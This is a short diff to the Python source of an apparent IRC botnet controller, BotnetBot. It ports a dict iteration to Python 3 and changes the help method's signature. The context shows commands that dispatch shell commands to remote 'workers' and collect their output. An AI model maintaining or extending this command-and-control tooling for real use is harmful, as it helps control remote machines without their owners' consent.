@@ -255,7 +255,7 @@ class BotnetBot(IRCBot):
         task = self.tasks[task_id]
         
         def printer(task):
-            for nick, data in task.data.iteritems():
+            for nick, data in task.data.items():
                 worker = self.workers[nick]
                 self.send_user('[%s:%s] - %s' % (worker.nick, worker.name, task.command))
                 for line in data.splitlines():
@@ -316,7 +316,7 @@ class BotnetBot(IRCBot):
         else:
             self.register(nick, message, channel, hostname)
 
-    def help(self, nick, message, channel, hostname):
+    def help(self, nick, message, channel):
         self.send_user('!execute (num workers) <command> -- run "command" on workers')
         self.send_user('!print (task id) -- print output of tasks or task with id')
         self.send_user('!stop -- tell workers to stop their current task')
